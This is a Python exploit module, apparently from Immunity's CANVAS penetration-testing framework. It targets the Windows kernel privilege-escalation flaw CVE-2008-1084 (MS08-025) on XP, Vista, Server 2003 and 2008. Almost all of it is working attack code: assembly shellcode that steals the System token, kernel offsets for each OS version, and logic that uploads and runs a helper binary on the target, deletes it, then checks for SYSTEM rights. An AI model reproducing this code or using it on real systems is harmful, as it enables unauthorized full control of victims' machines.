#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path:
    sys.path.append(".")

import socket
import time
import struct
import base64

from exploitutils import *
from canvasexploit import canvasexploit
from shelllistener import *
from ExploitTypes.localexploit import LocalExploit
from MOSDEF import mosdef
import canvasengine

NAME='Win32k ClientLoadMenu Privilege Escalation'
DESCRIPTION='Vulnerability in Windows Kernel Could Allow Elevation of Privilege'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Repeatability"]="One Shot"
DOCUMENTATION["CVE Name"] = "CVE-2008-1084"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1084"
DOCUMENTATION['CVSS'] = 7.2
DOCUMENTATION["CVS URL"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1084"
DOCUMENTATION["MSRC"] = "http://www.microsoft.com/technet/security/Bulletin/MS08-025.mspx"
DOCUMENTATION["Date public"] = "04/08/2008"

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP','Vista','2008']
PROPERTY['MSADV']='MS08-025'
PROPERTY['MS PATCHES']=["KB941693"]

NOTES="""
"""

TODO="""
"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name=NAME
        self.upload_filename='Resources/ms08_025.exe'
        self.remote_filename=''
        self.result = 0

    def CreateRing0Shellcode(self,pid=-1,retadd=0,osmajor=-1,osminor=-1):
        """Replace the Token of a Process by the one of the System process
           If _pid_ is -1, then the 'current' process Token will be replaced,
           otherwise, the one of the process with the given _pid_ will be.
           _retadd_ adjusts the stack for the 'ret' instruction, it depends
           from where your shellcode is called"""

        self.log('pid=%d, osmajor=%d, osminor=%d'%(pid,osmajor,osminor))
        ring0shellcode="""    xorl %eax,%eax
    movl %fs:0x124(%eax),%eax
    movl 0xProcessOffset(%eax),%eax
    movl %eax,%ecx
find_system_process:
    movl 0xActiveProcessLinksOffset(%eax),%eax
    subl $0xActiveProcessLinksOffset,%eax
    cmpl $0xSystemProcessId,0xUniqueProcessIdOffset(%eax)
    jnz find_system_process
    movl 0xTokenOffset(%eax),%edx //Token of System process
    movl %ecx,%eax
"""
        if pid!=-1:
            ring0shellcode+="""find_our_process:
    movl 0xActiveProcessLinksOffset(%eax),%eax
    subl $0xActiveProcessLinksOffset,%eax
    cmpl $0xOurProcessId,0xUniqueProcessIdOffset(%eax)
    jnz find_our_process
"""
        ring0shellcode+='    movl %edx,0xTokenOffset(%eax) //Replace the Token of our process\n'
        if retadd==0:
            ring0shellcode+='    ret\n'
        else:
            ring0shellcode+='    ret $0x%x\n'%(retadd)
        self.log('Creating RING0 Token stealing shellcode for ProcessId %d'%(pid))
        
        if osmajor==6:
            self.log('Windows Vista/2008 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x48 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0xa0 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x9c #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xe0 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==2:
            self.log('Windows Server 2003(R2) SP2 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x38 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x98 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x94 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xd8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==1:
            self.log('Windows XP RING0...')
            parameters={}
            parameters['ProcessOffset']=0x44 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x88 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x84 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xc8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        else:
            self.log('Invalid OS version')
            return 0

        for k in parameters.keys():
            ring0shellcode=ring0shellcode.replace(k,'%x'%(parameters[k]))
        self.shellcode=mosdef.assemble(ring0shellcode,'x86')
        print ring0shellcode #DEBUG

        return self.shellcode

    def run_attack(self,node):
        self.node=node #XXX: not needed?
        ret,nodeos=node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))
        if major<5:
            self.log('This exploit is only for Windows XP, Windows Vista and Windows Server 2008.')
            return 0
        pid=node.shell.getpid() #the ProcessId we want to elevate to System
        self.CreateRing0Shellcode(pid,4,major,minor)
        fixcode="""    xorl %eax,%eax
    movl $0x000004c2,0x800(%eax) //replace the beginning with ret $0x4
        """
        self.shellcode=mosdef.assemble(fixcode,'x86')+self.shellcode
        # Upload and execute the exploit with the shellcode as a commandline
        # argument.
        self.remote_filename=self.node.shell.getcwd()+'\\tempfile.exe'
        ret=self.node.shell.upload(self.upload_filename,destfilename=self.remote_filename)
        if ret:
            arguments=base64.b64encode(self.shellcode)
            ret=self.node.shell.dospawn('"%s" %s'%(self.remote_filename,arguments))
            self.log("DoSpawn Returned %s"%ret)
        time.sleep(3)
        self.log("Removing uploaded file")
        self.node.shell.unlink(self.remote_filename)
        whoami=self.exploitnodes("whoami",[node])[0]                                                                                                         
        self.log("Currently running as: %s"%whoami)
        if whoami[-1] == "$":
            self.log('Exploit succeeded!')
            self.setSucceeded()
            self.result = 1
            return 1
        self.log('Exploit seem to have failed.')
        return 0

    def run(self):
        self.setInfo('%s (in progress)'%(NAME))
        success=0 
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                self.log('Node %s not a Win32 node'%(node.getname()))
                continue
            try:
                ret=self.run_attack(node)
            except Exception as e:
                ret = 0
                self.log('Exploit seem to have failed')
            if ret==1:
                success=1
        return success

if __name__=='__main__':
    print 'This win32 local module is meant to be run only within CANVAS'
